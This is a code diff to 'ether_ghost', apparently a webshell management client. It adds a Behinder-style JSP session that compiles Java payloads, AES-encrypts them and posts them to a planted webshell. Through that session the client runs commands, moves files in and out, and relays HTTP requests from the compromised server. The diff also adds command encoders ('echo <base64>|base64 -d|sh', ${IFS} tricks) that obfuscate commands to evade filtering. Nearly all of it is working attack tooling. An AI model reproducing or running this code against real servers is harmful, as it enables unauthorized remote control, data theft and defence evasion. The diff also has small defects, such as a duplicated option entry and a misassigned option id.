@@ -1,0 +1,1313 @@
+diff --git a/ether_ghost/core/base.py b/ether_ghost/core/base.py
+index 719e547..06d3a3e 100644
+--- a/ether_ghost/core/base.py
++++ b/ether_ghost/core/base.py
+@@ -8,26 +8,25 @@ from ..utils.db import get_settings
+ import httpx
+ 
+ USER_AGENT = random_user_agent()
+-session_type_info = {}
+ 
+ 
+-class ConnOptionAlternative(t.TypedDict):
++class OptionAlternative(t.TypedDict):
+     name: str
+     value: str
+ 
+ 
+-class ConnOption(t.TypedDict):
++class Option(t.TypedDict):
+     id: str
+     name: str
+     type: t.Literal["text", "select", "checkbox"]
+     placeholder: t.Union[str, None]
+     default_value: t.Any
+-    alternatives: t.Union[t.List[ConnOptionAlternative], None]
++    alternatives: t.Union[t.List[OptionAlternative], None]
+ 
+ 
+-class ConnOptionGroup(t.TypedDict):
++class OptionGroup(t.TypedDict):
+     name: str
+-    options: t.List[ConnOption]
++    options: t.List[Option]
+ 
+ 
+ @dataclass
+@@ -39,6 +38,7 @@ class DirectoryEntry:
+     filesize: int
+     entry_type: t.Literal["dir", "file", "link-dir", "link-file", "unknown"] = "file"
+ 
++
+ @dataclass
+ class BasicInfoEntry:
+     """有关session的一项基本信息"""
+@@ -47,6 +47,14 @@ class BasicInfoEntry:
+     value: str
+ 
+ 
++class HttpResponseDict(t.TypedDict):
++    """HTTP响应字典"""
++
++    status_code: int
++    headers: t.Dict[str, str]
++    body: bytes
++
++
+ # Session对象会在处理一个请求的时候创建，请求结束时立即丢弃
+ # 所以Session对象基本上是无状态的，状态会在请求结束后被丢弃
+ 
+@@ -54,6 +62,14 @@ class BasicInfoEntry:
+ class SessionInterface:
+     """Session接口"""
+ 
++    session_type: t.ClassVar[str]
++    readable_name: t.ClassVar[str]
++    conn_options: t.ClassVar[t.List[OptionGroup]]
++
++    def __init__(self, session_conn: dict) -> None:
++        """初始化session，传入连接配置字典"""
++        pass
++
+     async def execute_cmd(self, cmd: str) -> str:
+         """在目标上执行命令"""
+         raise NotImplementedError()
+@@ -130,6 +146,17 @@ class SessionInterface:
+         """打开一个反弹shell"""
+         raise NotImplementedError()
+ 
++    async def send_http_request(
++        self,
++        url: str,
++        method: str = "GET",
++        headers: t.Optional[t.Dict[str, str]] = None,
++        params: t.Optional[t.Dict[str, t.Any]] = None,
++        data: t.Optional[t.Union[str, bytes]] = None,
++    ) -> HttpResponseDict:
++        """发送HTTP请求"""
++        raise NotImplementedError()
++
+ 
+ class PHPSessionInterface(SessionInterface):
+     """PHP Session接口"""
+@@ -154,21 +181,28 @@ class PHPSessionInterface(SessionInterface):
+         raise NotImplementedError()
+ 
+ 
++class SessionTypeInfo(t.TypedDict, total=False):
++    constructor: t.Callable[[dict], SessionInterface]
++    options: t.List[OptionGroup]
++    readable_name: str
++    session_class: t.Type[SessionInterface]
++
++
++session_type_info: t.Dict[str, SessionTypeInfo] = {}
++
++
+ def register_session(cls):
+     """装饰session class, 注册一个session
+-    class必需的属性
+-      - .conn_options (t.List[ConnOptionGroup]):
+-        注明所需的每个选项
+-      - .readable_name (str):
+-        session的名字
+-      - .session_type (str):
+-        session的ID，可以包含大小写字符和下划线
++    不要使用这个函数注册connector的session
++    `register_connector`会自动使用其他方式注册对应的connector
+     """
+     session_type_info[cls.session_type] = {
+         "constructor": cls,
+         "options": cls.conn_options,
+         "readable_name": cls.readable_name,
++        "session_class": cls,
+     }
++    # 不再自动注册直接型connector，现在需要手动定义并使用register_direct_connector装饰器
+     return cls
+ 
+ 
+diff --git a/ether_ghost/sessions/jsp_behinder.py b/ether_ghost/sessions/jsp_behinder.py
+new file mode 100644
+index 0000000..948dcdb
+--- /dev/null
++++ b/ether_ghost/sessions/jsp_behinder.py
+@@ -0,0 +1,532 @@
++from pathlib import Path
++import asyncio
++import base64
++import re
++import json
++import logging
++import subprocess
++import os
++import typing as t
++import tempfile
++
++from Crypto.Cipher import AES
++from Crypto.Util.Padding import pad
++import httpx
++
++from ..core import exceptions
++
++from ..core.base import (
++    register_session,
++    BasicInfoEntry,
++    Option,
++    OptionGroup,
++    DirectoryEntry,
++    get_http_client,
++    HttpResponseDict,
++)
++
++from ..utils.tools import parse_permission, java_repr, md5_encode, base64_encode
++
++
++logger = logging.getLogger("core.sessions.php_behinder")
++
++PAYLOAD_PATH = Path(__file__).parent / "Payload.java"
++assert PAYLOAD_PATH.exists(), f"Cannot find Payload.java at {Path(__file__).parent}"
++
++def behinder_aes(payload: bytes, key: bytes) -> bytes:
++    """将给定的payload按照冰蝎的格式进行AES加密"""
++    cipher = AES.new(key, AES.MODE_ECB)
++    encrypted_data = cipher.encrypt(pad(payload, AES.block_size))
++    return base64.b64encode(encrypted_data)
++
++
++class JSPWebshellBehinderAES:
++    session_type = "BEHINDER_JSP_AES"
++    readable_name = "[测试] 冰蝎JSP"
++    conn_options: t.List[OptionGroup] = [
++        {
++            "name": "基本连接配置",
++            "options": [
++                Option(
++                    id="url",
++                    name="地址",
++                    type="text",
++                    placeholder="http://xxx.com",
++                    default_value=None,
++                    alternatives=None,
++                ),
++                Option(
++                    id="password",
++                    name="密码",
++                    type="text",
++                    placeholder="******",
++                    default_value="rebeyond",
++                    alternatives=None,
++                ),
++            ],
++        },
++        {
++            "name": "高级连接配置",
++            "options": [
++                Option(
++                    id="timeout_refresh_client",
++                    name="超时更换HTTP Session",
++                    type="checkbox",
++                    placeholder="一直使用相同的PHPSESSID可能会导致前一个长时间操作阻塞接下来的操作",
++                    default_value=True,
++                    alternatives=None,
++                ),
++                Option(
++                    id="https_verify",
++                    name="验证HTTPS证书",
++                    type="checkbox",
++                    placeholder=None,
++                    default_value=True,
++                    alternatives=None,
++                ),
++                Option(
++                    id="updownload_chunk_size",
++                    name="文件上传下载分块大小",
++                    type="text",
++                    placeholder="文件上传下载的分块大小，单位为字节，注意每上传一块就要编译一次payload",
++                    default_value=str(1024 * 32),
++                    alternatives=None,
++                ),
++                Option(
++                    id="updownload_max_coroutine",
++                    name="文件上传下载并发量",
++                    type="text",
++                    placeholder="控制文件上传和下载时的最大协程数量",
++                    default_value="4",
++                    alternatives=None,
++                ),
++            ],
++        },
++        {
++            "name": "其他配置",
++            "options": [
++                Option(
++                    id="compile_max_coroutine",
++                    name="编译Payload并发量",
++                    type="text",
++                    placeholder="使用javac编译payload的最大进程数",
++                    default_value="4",
++                    alternatives=None,
++                ),
++                Option(
++                    id="javac_target_version",
++                    name="javac编译源版本",
++                    type="text",
++                    placeholder="使用javac编译payload的源版本号，即javac -source",
++                    default_value="1.8",
++                    alternatives=None,
++                ),
++                Option(
++                    id="javac_target_version",
++                    name="javac编译目标版本",
++                    type="text",
++                    placeholder="使用javac编译payload的目标版本号javac -target",
++                    default_value="1.8",
++                    alternatives=None,
++                ),
++                Option(
++                    id="extra_compile_args",
++                    name="额外编译参数",
++                    type="text",
++                    placeholder="额外的javac编译参数，JSON列表格式，如'[\"-parameters\", \"-Xlint:unchecked\"]'",
++                    default_value="[]",
++                    alternatives=None,
++                ),
++                Option(
++                    id="compile_env_vars",
++                    name="编译环境变量",
++                    type="text",
++                    placeholder="编译时的环境变量，JSON字典格式，如'{\"CLASSPATH\": \"/path/to/servlet-api.jar\"}'",
++                    default_value="{}",
++                    alternatives=None,
++                ),
++            ],
++        },
++    ]
++
++    def __init__(self, session_conn: dict):
++        self.url = session_conn["url"]
++        self.key = md5_encode(session_conn["password"])[:16].encode()
++        self.https_verify = session_conn.get("https_verify", False)
++        self.client = get_http_client(verify=self.https_verify)
++        self.timeout_refresh_client = session_conn.get("timeout_refresh_client", True)
++        self.updownload_chunk_size = int(
++            session_conn.get("updownload_chunk_size", 1024 * 128)
++        )
++        self.updownload_max_coroutine = int(
++            session_conn.get("updownload_max_coroutine", 4)
++        )
++
++        self.compile_semaphore = asyncio.Semaphore(
++            int(session_conn.get("compile_max_coroutine", 4))
++        )
++
++        self.javac_source_version = session_conn.get("javac_source_version", "1.8")
++
++        self.javac_target_version = session_conn.get("javac_target_version", "1.8")
++        
++        extra_args_str = session_conn.get("extra_compile_args", "[]")
++        try:
++            self.extra_compile_args = json.loads(extra_args_str)
++            if not isinstance(self.extra_compile_args, list):
++                self.extra_compile_args = []
++        except json.JSONDecodeError:
++            self.extra_compile_args = []
++        
++        compile_env_vars_str = session_conn.get("compile_env_vars", "{}")
++        self.compile_env_vars = os.environ.copy()  # 默认使用当前环境
++        try:
++            user_env_vars = json.loads(compile_env_vars_str)
++            if isinstance(user_env_vars, dict):
++                self.compile_env_vars.update(user_env_vars)
++        except json.JSONDecodeError:
++            pass  # 保持默认环境
++
++    async def submit_code(self, action_code: str):
++        code = PAYLOAD_PATH.read_text()
++        code = re.sub(
++            ".+ETHER_GHOST_REPLACE_HERE", f"Object data = {action_code};", code
++        )
++        data = None
++        with tempfile.TemporaryDirectory(delete=False) as d:
++            payload_code_filepath = Path(d) / "Payload.java"
++            payload_bin_filepath = Path(d) / "Payload.class"
++            payload_code_filepath.write_text(code)
++            return_code = None
++            async with self.compile_semaphore:
++                command = ["javac", "-source", self.javac_source_version, "-target", self.javac_target_version]
++                command.extend(self.extra_compile_args)
++                command.append(payload_code_filepath.as_posix())
++                p = subprocess.Popen(command, env=self.compile_env_vars)
++                while p.poll() is None:
++                    await asyncio.sleep(0)
++                return_code = p.wait()
++            assert return_code == 0, f"javac exit with {return_code=}"
++            assert payload_bin_filepath.exists(), "javac failed to build payload"
++            data = behinder_aes(payload_bin_filepath.read_bytes(), self.key)
++        try:
++            response = await self.client.request(
++                method="POST", url=self.url, content=data
++            )
++            if response.status_code != 200:
++                raise exceptions.TargetError(f"{response.status_code=}")
++            try:
++                data = json.loads(base64.b64decode(response.text))
++            except Exception as e:
++                raise exceptions.TargetError(
++                    "Cannot decode response: " + repr(response.text)[:30]
++                ) from e
++            if data["code"] != 0:
++                if data["error_type"] == "java.io.IOException":
++                    raise exceptions.FileError(data["msg"])
++                raise exceptions.TargetError(
++                    f"{data['code']=} {data['error_type']=} {data['msg']=}"
++                )
++            return data["data"]
++        except httpx.TimeoutException as exc:
++            # 使用某个session id进行长时间操作(比如sleep 100)时会触发HTTP超时
++            # 此时服务端会为这个session id等待这个长时间操作
++            # 所以我们再使用这个session id发起请求就会卡住
++            # 所以我们要丢掉这个session id，使用另一个client发出请求
++            if self.timeout_refresh_client:
++                logger.warning("HTTP请求受控端超时，尝试刷新HTTP Client")
++                self.client = get_http_client(verify=self.https_verify)
++            raise exceptions.NetworkError("HTTP请求受控端超时") from exc
++        except httpx.HTTPError as exc:
++            raise exceptions.NetworkError(
++                "发送HTTP请求到受控端失败：" + str(exc)
++            ) from exc
++
++    async def execute_cmd(self, cmd: str) -> str:
++        return "\n".join(await self.submit_code(f"runCommand({java_repr(cmd)})"))
++
++    async def test_usablility(self) -> bool:
++        return (await self.submit_code("ping()"))["name"] == "EtherGhost JSP"
++
++    async def list_dir(self, dir_path: str) -> t.List[DirectoryEntry]:
++        entries = await self.submit_code(f"listFiles({java_repr(dir_path)})")
++        try:
++            result = [
++                DirectoryEntry(
++                    name="..",
++                    permission="777",
++                    filesize=0,
++                    entry_type="dir",
++                )
++            ] + [
++                DirectoryEntry(
++                    name=str(entry["name"]),
++                    permission=parse_permission(entry["permission"]),
++                    filesize=int(entry["filesize"]),
++                    entry_type=entry["entry_type"],
++                )
++                for entry in entries
++                if entry["entry_type"]
++                in ["dir", "file", "link-dir", "link-file", "unknown"]
++            ]
++            return result
++        except Exception as exc:
++            raise exceptions.TargetRuntimeError(f"解码结果失败: {exc}") from exc
++
++    async def mkdir(self, dir_path: str) -> None:
++        await self.submit_code(f"mkdir({java_repr(dir_path)})")
++
++    async def get_file_contents(
++        self, filepath: str, max_size: int | None = None
++    ) -> bytes:
++        """获取文件的内容，内容是一个字节序列，不是已经解码的字符串"""
++        if max_size is None:
++            max_size = self.updownload_chunk_size
++        content_b64 = await self.submit_code(
++            f"getFileContentsBase64({java_repr(filepath)}, {max_size})"
++        )
++        try:
++            return base64.b64decode(content_b64)
++        except Exception as exc:
++            raise exceptions.TargetRuntimeError("base64解码失败") from exc
++
++    async def put_file_contents(self, filepath: str, content: bytes) -> bool:
++        """保存文件的内容，内容是一个字节序列，不是已经解码的字符串"""
++        await self.submit_code(
++            f"putFileContents({java_repr(filepath)}, "
++            f"base64Decode({java_repr(base64_encode(content))}))"
++        )
++        return True
++
++    async def delete_file(self, filepath: str) -> bool:
++        return await self.submit_code(f"deleteFile({java_repr(filepath)})")
++
++    async def move_file(self, filepath: str, new_filepath: str) -> None:
++        await self.submit_code(
++            f"moveFile({java_repr(filepath)}, {java_repr(new_filepath)})"
++        )
++
++    async def copy_file(self, filepath: str, new_filepath: str) -> None:
++        await self.submit_code(
++            f"copyFile({java_repr(filepath)}, {java_repr(new_filepath)})"
++        )
++
++    async def upload_file(
++        self, filepath: str, content: bytes, callback: t.Union[t.Callable, None] = None
++    ) -> bool:
++        semaphore = asyncio.Semaphore(self.updownload_max_coroutine)
++        write_state_lock = asyncio.Lock()
++
++        chunk_size = self.updownload_chunk_size
++        coros: t.List[t.Awaitable] = []
++        done_coro = 0
++        done_bytes = 0
++        filepath_status = await self.submit_code(
++            f"checkUploadFilepath({java_repr(filepath)})"
++        )
++        if filepath_status == "WRONG_NO_PERMISSION":
++            raise exceptions.FileError("没有权限写入文件")
++        if filepath_status == "WRONG_EXISTED":
++            raise exceptions.FileError("文件已经存在")
++        if filepath_status != "OK":
++            raise exceptions.TargetRuntimeError("检查文件路径时发生未知错误")
++
++        async def upload_chunk(chunk: bytes):
++            nonlocal done_coro, done_bytes
++            filepath = None
++            async with semaphore:
++                chunk_b64 = base64_encode(chunk)
++                filepath = await self.submit_code(
++                    f"putTempFile(base64Decode({java_repr(chunk_b64)}))"
++                )
++            async with write_state_lock:
++                done_coro += 1
++                done_bytes += len(chunk)
++                if callback:
++                    callback(
++                        done_coro=done_coro,
++                        max_coro=len(coros),
++                        done_bytes=done_bytes,
++                        max_bytes=len(content),
++                    )
++            return filepath
++
++        coros = [
++            upload_chunk(content[i : i + chunk_size])
++            for i in range(0, len(content), chunk_size)
++        ]
++        uploaded_chunks = await asyncio.gather(*coros)
++        result = await self.submit_code(
++            f"mergeFiles({java_repr(uploaded_chunks)}, {java_repr(filepath)})"
++        )
++        return result  # can only be true
++
++    async def download_file(
++        self, filepath: str, callback: t.Union[t.Callable, None] = None
++    ) -> bytes:
++        filesize_text = await self.submit_code(f"getFileSize({java_repr(filepath)})")
++        if filesize_text == "WRONG_NOT_EXISTS":
++            raise exceptions.FileError("文件不存在")
++        if filesize_text == "WRONG_NO_PERMISSION":
++            raise exceptions.FileError("没有权限读取文件")
++        filesize = None
++        try:
++            filesize = int(filesize_text)
++        except Exception as exc:
++            raise exceptions.TargetRuntimeError(
++                f"读取文件大小失败：{filesize_text=}"
++            ) from exc
++
++        sem = asyncio.Semaphore(self.updownload_max_coroutine)
++        write_state_lock = asyncio.Lock()
++        chunk_size = self.updownload_chunk_size
++        done_coro = 0
++        done_bytes = 0
++        coros: t.List[t.Awaitable] = []
++
++        async def download_chunk(offset: int) -> bytes:
++            nonlocal done_coro, coros, done_bytes
++            result = None
++            async with sem:
++                await asyncio.sleep(0.01)  # we don't ddos
++                result_b64 = await self.submit_code(
++                    f"downloadPartialFileBase64("
++                    f"{java_repr(filepath)}, {java_repr(offset)}, {java_repr(chunk_size)})"
++                )
++                if result_b64 == "WRONG_NOT_EXISTS":
++                    raise exceptions.FileError("文件不存在或者不是一个普通文件")
++                elif result_b64 == "WRONG_NO_PERMISSION":
++                    raise exceptions.FileError("没有读取权限")
++                result = base64.b64decode(result_b64)
++            async with write_state_lock:
++                done_coro += 1
++                done_bytes += len(result)
++                if callback:
++                    callback(
++                        done_coro=done_coro,
++                        max_coro=len(coros),
++                        done_bytes=min(done_bytes, filesize),
++                        max_bytes=filesize,
++                    )
++
++            return result
++
++        coros = [download_chunk(i) for i in range(0, filesize, chunk_size)]
++        chunks = await asyncio.gather(
++            *coros,
++            return_exceptions=True,
++        )
++        result = b""
++        for chunk_result in chunks:
++            if not isinstance(chunk_result, bytes):
++                exc = chunk_result if isinstance(chunk_result, Exception) else None
++                raise exceptions.FileError(
++                    "下载文件失败: " + str(chunk_result)
++                ) from exc
++            result += chunk_result
++        return result
++
++    async def send_bytes_over_tcp(
++        self,
++        host: str,
++        port: int,
++        content: bytes,
++        send_method: t.Union[str, None] = None,
++    ) -> t.Union[bytes, None]:
++        raise exceptions.ServerError("JSP Webshell暂时不支持此方法")
++
++    async def get_send_tcp_support_methods(self) -> t.List[str]:
++        return []  # JSP Webshell暂时不支持此方法
++
++    async def get_basicinfo(self) -> t.List[BasicInfoEntry]:
++        """获取当前的基本信息"""
++        info = await self.submit_code("get_basicinfo()")
++        return [
++            BasicInfoEntry(key="Current Directory", value=info["current_directory"]),
++            BasicInfoEntry(key="System Version", value=info["system_version"]),
++            BasicInfoEntry(key="Java Version", value=info["java_version"]),
++            BasicInfoEntry(key="JSP Location", value=info["jsp_location"])
++        ]
++
++    async def open_reverse_shell(self, host: str, port: int) -> None:
++        """打开一个反弹shell"""
++        # [TODO] 写一下这个方法
++        raise exceptions.ServerError("JSP Webshell暂时不支持此方法")
++
++    async def get_pwd(self) -> str:
++        return await self.submit_code("getPwd()")
++
++    async def send_http_request(
++        self,
++        url: str,
++        method: str = "GET",
++        headers: t.Optional[t.Dict[str, str]] = None,
++        params: t.Optional[t.Dict[str, t.Any]] = None,
++        data: t.Optional[t.Union[str, bytes]] = None
++    ) -> "HttpResponseDict":
++        """发送HTTP请求"""
++        import base64
++        from ..core.base import HttpResponseDict
++
++        # 将headers和params转换为Java HashMap
++        headers_java = java_repr(headers) if headers is not None else "new java.util.HashMap<String, String>()"
++        params_java = java_repr(params) if params is not None else "new java.util.HashMap<String, String>()"
++
++        # 处理data
++        data_b64 = ""
++        if isinstance(data, bytes):
++            data_b64 = base64_encode(data)
++        elif isinstance(data, str):
++            data_b64 = base64_encode(data.encode())
++        # 如果data为None，data_b64保持空字符串
++
++        # 构建Java代码
++        java_code = f"sendHttpRequest({java_repr(url)}, {java_repr(method)}, {headers_java}, {params_java}, {java_repr(data_b64)})"
++
++        # 提交代码并获取结果
++        result = await self.submit_code(java_code)
++
++        # 解析结果
++        if not isinstance(result, dict):
++            raise exceptions.TargetRuntimeError(f"sendHttpRequest返回的结果不是字典: {result}")
++
++        status_code = result.get("status_code")
++        if status_code is None:
++            raise exceptions.TargetRuntimeError("sendHttpRequest返回的字典缺少status_code")
++
++        headers_dict = result.get("headers")
++        if headers_dict is None:
++            raise exceptions.TargetRuntimeError("sendHttpRequest返回的字典缺少headers")
++
++        body_b64 = result.get("body")
++        if body_b64 is None:
++            raise exceptions.TargetRuntimeError("sendHttpRequest返回的字典缺少body")
++
++        # 解码body
++        body_bytes = base64.b64decode(body_b64) if body_b64 else b""
++
++        return {
++            "status_code": status_code,
++            "headers": headers_dict,
++            "body": body_bytes
++        }
++
++
++import uuid
++from ..session_connector import DirectSessionConnector, register_direct_connector
++
++@register_direct_connector
++class JSPWebshellBehinderAESConnector(DirectSessionConnector):
++    connector_name = "BEHINDER_JSP_AES"
++    connector_name_readable = "JSP冰蝎AES"
++    session_class = JSPWebshellBehinderAES
++    options = JSPWebshellBehinderAES.conn_options
++
++    def get_session_type(self) -> str:
++        return self.session_class.session_type
++
++    def build_session(self, config: dict):
++        return self.session_class(config)
++
++    async def close_session(self, config: dict):
++        pass
+diff --git a/ether_ghost/sessions/linux_cmd_oneliner.py b/ether_ghost/sessions/linux_cmd_oneliner.py
+index 711ce6b..1847d44 100644
+--- a/ether_ghost/sessions/linux_cmd_oneliner.py
++++ b/ether_ghost/sessions/linux_cmd_oneliner.py
+@@ -5,25 +5,28 @@ import base64
+ import shlex
+ import hashlib
+ import httpx
++from urllib.parse import quote
+ 
+ from ..core import exceptions
+ 
+ from ..core.base import (
+     register_session,
+-    ConnOption,
+-    ConnOptionGroup,
++    Option,
++    OptionGroup,
+     DirectoryEntry,
+     BasicInfoEntry,
++    HttpResponseDict,
+     get_http_client,
+ )
+ 
+ from ..utils.random_data import random_string
++from ..utils.tools import user_json_loads
+ 
+ logger = logging.getLogger("core.sessions.linux_cmd_oneliner")
+ 
+ WRAPPER_CODE = """
+-echo "{start1}""{start2}";
+-({code})
++echo -n "{start1}""{start2}";
++({code}) {decoder}
+ echo {stop}
+ """
+ 
+@@ -103,15 +106,14 @@ def parse_file_permission(perm: str):
+     return result
+ 
+ 
+-@register_session
+ class LinuxCmdOneLiner:
+     session_type = "LINUX_CMD_ONELINER"
+     readable_name = "Linux命令执行"
+-    conn_options: t.List[ConnOptionGroup] = [
++    conn_options: t.List[OptionGroup] = [
+         {
+             "name": "基本连接配置",
+             "options": [
+-                ConnOption(
++                Option(
+                     id="url",
+                     name="地址",
+                     type="text",
+@@ -119,7 +121,7 @@ class LinuxCmdOneLiner:
+                     default_value=None,
+                     alternatives=None,
+                 ),
+-                ConnOption(
++                Option(
+                     id="password",
+                     name="密码",
+                     type="text",
+@@ -127,12 +129,47 @@ class LinuxCmdOneLiner:
+                     default_value=None,
+                     alternatives=None,
+                 ),
++                Option(
++                    id="password_method",
++                    name="密码传参方式",
++                    type="select",
++                    placeholder="POST",
++                    default_value="POST",
++                    alternatives=[
++                        {"name": "POST", "value": "POST"},
++                        {"name": "GET", "value": "GET"},
++                        {"name": "Header", "value": "Header"},
++                    ],
++                ),
+             ],
+         },
+         {
+             "name": "高级连接配置",
+             "options": [
+-                ConnOption(
++                Option(
++                    id="encoder",
++                    name="命令编码器",
++                    type="select",
++                    placeholder="raw",
++                    default_value="raw",
++                    alternatives=[
++                        {"name": "raw", "value": "raw"},
++                        {"name": "base64_quote", "value": "base64_quote"},
++                        {"name": "base64_ifs", "value": "base64_ifs"},
++                    ],
++                ),
++                Option(
++                    id="decoder",
++                    name="解码器",
++                    type="select",
++                    placeholder="raw",
++                    default_value="raw",
++                    alternatives=[
++                        {"name": "raw", "value": "raw"},
++                        {"name": "base64", "value": "base64"},
++                    ],
++                ),
++                Option(
+                     id="https_verify",
+                     name="验证HTTPS证书",
+                     type="checkbox",
+@@ -140,7 +177,7 @@ class LinuxCmdOneLiner:
+                     default_value=True,
+                     alternatives=None,
+                 ),
+-                ConnOption(
++                Option(
+                     id="updownload_chunk_size",
+                     name="文件上传下载分块大小",
+                     type="text",
+@@ -148,7 +185,7 @@ class LinuxCmdOneLiner:
+                     default_value="1024",
+                     alternatives=None,
+                 ),
+-                ConnOption(
++                Option(
+                     id="updownload_max_coroutine",
+                     name="文件上传下载并发量",
+                     type="text",
+@@ -156,6 +193,30 @@ class LinuxCmdOneLiner:
+                     default_value="4",
+                     alternatives=None,
+                 ),
++                Option(
++                    id="extra_post_params",
++                    name="额外的POST参数",
++                    type="text",
++                    placeholder='保存着额外参数的JSON对象，如{"passwd": "123"}',
++                    default_value="{}",
++                    alternatives=None,
++                ),
++                Option(
++                    id="extra_headers",
++                    name="额外的headers",
++                    type="text",
++                    placeholder='保存着额外参数的JSON对象或null，如{"passwd": "123"}',
++                    default_value="{}",
++                    alternatives=None,
++                ),
++                Option(
++                    id="extra_headers",
++                    name="额外的headers",
++                    type="text",
++                    placeholder='保存着额外参数的JSON对象或null，如{"passwd": "123"}',
++                    default_value="{}",
++                    alternatives=None,
++                ),
+             ],
+         },
+     ]
+@@ -164,7 +225,18 @@ class LinuxCmdOneLiner:
+         # super().__init__(session_conn)
+         self.url = session_conn["url"]
+         self.password = session_conn["password"]
++        self.password_method = session_conn.get("password_method", "POST").upper()
+         self.https_verify = session_conn.get("https_verify", False)
++
++        self.params = user_json_loads(session_conn.get("extra_get_params", "{}"), dict)
++        self.data = user_json_loads(session_conn.get("extra_post_params", "{}"), dict)
++        self.headers = user_json_loads(
++            session_conn.get("extra_headers", "null"), (dict, type(None))
++        )
++
++        self.decoder = session_conn.get("decoder", "raw")
++        self.encoder = session_conn.get("encoder", "raw")
++
+         self.client = get_http_client(verify=self.https_verify)
+ 
+         # for upload file and download file
+@@ -206,7 +278,9 @@ class LinuxCmdOneLiner:
+ 
+             filetype = perm[0]
+             perm = parse_file_permission(perm[1:10])
+-            filetype = {"f": "file", "d": "dir", "l": "link"}.get(filetype, "unknown")
++            filetype = {"-": "file", "f": "file", "d": "dir", "l": "link"}.get(
++                filetype, "unknown"
++            )
+             if filetype == "link":
+                 filetype = "link-dir" if name.endswith("/") else "link-file"
+                 name = name.split(" ->")[0]
+@@ -215,6 +289,10 @@ class LinuxCmdOneLiner:
+                     name=name,
+                     permission=perm,
+                     filesize=int(filesize),
++                    entry_type=t.cast(
++                        t.Literal["dir", "file", "link-dir", "link-file", "unknown"],
++                        filetype,
++                    ),
+                 )
+             )
+         return result
+@@ -301,10 +379,11 @@ class LinuxCmdOneLiner:
+                         done_bytes=done_bytes,
+                         max_bytes=len(content),
+                     )
+-            if "DONE" not in result:
++            result = result.strip()
++            if not result.startswith("DONE"):
+                 raise exceptions.FileError("上传分块失败")
+ 
+-            return result.strip().removeprefix("DONE").strip()
++            return result.removeprefix("DONE").strip()
+ 
+         coros = [
+             upload_chunk(content[i : i + chunk_size])
+@@ -388,6 +467,99 @@ class LinuxCmdOneLiner:
+         """得到发送字节支持的TCP方法"""
+         return []
+ 
++    async def send_http_request(
++        self,
++        url: str,
++        method: str = "GET",
++        headers: t.Optional[t.Dict[str, str]] = None,
++        params: t.Optional[t.Dict[str, t.Any]] = None,
++        data: t.Optional[t.Union[str, bytes]] = None,
++    ) -> "HttpResponseDict":
++        """发送HTTP请求"""
++        import json
++        import base64
++        from urllib.parse import urlencode
++        from ..core.base import HttpResponseDict
++
++        # 检查curl是否存在
++        curl_check = await self.submit(["which", "curl"])
++        if not curl_check.strip():
++            raise exceptions.TargetError("目标系统未安装curl命令")
++
++        # 构建curl命令
++        cmd_parts = ["curl", "-s", "-i"]
++        cmd_parts.extend(["-X", method])
++
++        # 添加headers
++        if headers:
++            for key, value in headers.items():
++                cmd_parts.extend(["-H", f"{key}: {value}"])
++
++        # 构建URL和查询参数
++        full_url = url
++        if params:
++            query_string = urlencode(params)
++            full_url = f"{url}?{query_string}"
++
++        # 添加data
++        if data is not None:
++            if isinstance(data, bytes):
++                data_b64 = base64.b64encode(data).decode()
++                temp_check = await self.submit(["which", "mktemp"])
++                if temp_check.strip():
++                    temp_file = "/tmp/curl_data_$(mktemp -u)"
++                    upload_cmd = f"echo {data_b64} | base64 -d > {temp_file}"
++                    await self.submit(upload_cmd)
++                    cmd_parts.extend(["--data-binary", f"@{temp_file}"])
++                else:
++                    try:
++                        data_str = data.decode("utf-8")
++                        cmd_parts.extend(["--data", data_str])
++                    except UnicodeDecodeError:
++                        cmd_parts.extend(["--data", data_b64])
++            else:
++                cmd_parts.extend(["--data", data])
++
++        cmd_parts.append(full_url)
++
++        # 执行命令
++        cmd_str = " ".join([shlex.quote(part) for part in cmd_parts])
++        output = await self.submit(cmd_str)
++
++        # 解析输出
++        lines = output.splitlines()
++        if not lines:
++            raise exceptions.NetworkError("HTTP请求无响应")
++
++        # 解析状态行
++        status_line = lines[0]
++        if not status_line.startswith("HTTP/"):
++            raise exceptions.NetworkError(f"无效的HTTP响应: {status_line}")
++        try:
++            status_code = int(status_line.split()[1])
++        except (IndexError, ValueError):
++            raise exceptions.NetworkError(f"无法解析状态码: {status_line}")
++
++        # 解析headers和body
++        headers_dict = {}
++        body_lines = []
++        in_body = False
++        for line in lines[1:]:
++            if not in_body:
++                if line.strip() == "":
++                    in_body = True
++                    continue
++                if ":" in line:
++                    key, value = line.split(":", 1)
++                    headers_dict[key.strip()] = value.strip()
++            else:
++                body_lines.append(line)
++
++        body = "\n".join(body_lines)
++        body_bytes = body.encode() if body else b""
++
++        return {"status_code": status_code, "headers": headers_dict, "body": body_bytes}
++
+     async def get_basicinfo(self):
+         # TODO: 多加一点命令
+         cmds = ["uname -a", "whoami", "id", "groups", "pwd"]
+@@ -396,7 +568,6 @@ class LinuxCmdOneLiner:
+         for line in (await self.submit(info)).splitlines():
+             line = line.strip().removeprefix("start").removesuffix("stop")
+             if "|" not in line:
+-                print(f"{line=}")
+                 continue
+             cmd, output_b64 = line.split("|", maxsplit=1)
+             try:
+@@ -415,13 +586,35 @@ class LinuxCmdOneLiner:
+             start2=start2,
+             code=payload if isinstance(payload, str) else shell_command(payload),
+             stop=stop,
++            decoder={"raw": "", "base64": "|base64 -w0"}.get(self.decoder, ""),
+         )
++        if self.encoder == "base64_quote":
++            code = shell_command(
++                [
++                    "sh",
++                    "-c",
++                    "echo "
++                    + base64.b64encode(code.encode()).decode()
++                    + "|base64 -d|sh",
++                ]
++            )
++        elif self.encoder == "base64_ifs":
++            code = (
++                "sh -c echo${IFS}"
++                + base64.b64encode(code.encode()).decode()
++                + "|base64${IFS}-d|sh"
++            )
++        elif self.encoder == "raw":
++            pass
++        else:
++            raise exceptions.UserError("未知encoder: " + self.encoder)
+         status_code, html = await self.submit_http(code)
+         if status_code == 404:
+             raise exceptions.TargetUnreachable(
+                 f"状态码404, 没有这个webshell: {status_code}"
+             )
+         if (start1 + start2) not in html:
++            logger.debug(f"HTML response: {html}")
+             raise exceptions.PayloadOutputError(
+                 "找不到输出文本的开头，也许webshell没有执行代码？"
+             )
+@@ -430,16 +623,68 @@ class LinuxCmdOneLiner:
+             raise exceptions.PayloadOutputError(
+                 "找不到输出文本的结尾，也许webshell没有执行代码？"
+             )
+-        result = html_afterstarted[: html_afterstarted.index(stop)]
+-        return result.removeprefix("\n")
++        todecode = html_afterstarted[: html_afterstarted.index(stop)].removeprefix("\n")
++
++        if self.decoder == "base64":
++            # TODO: allow user defind target encoding
++            return base64.b64decode(todecode).decode()
++        if self.decoder == "raw":
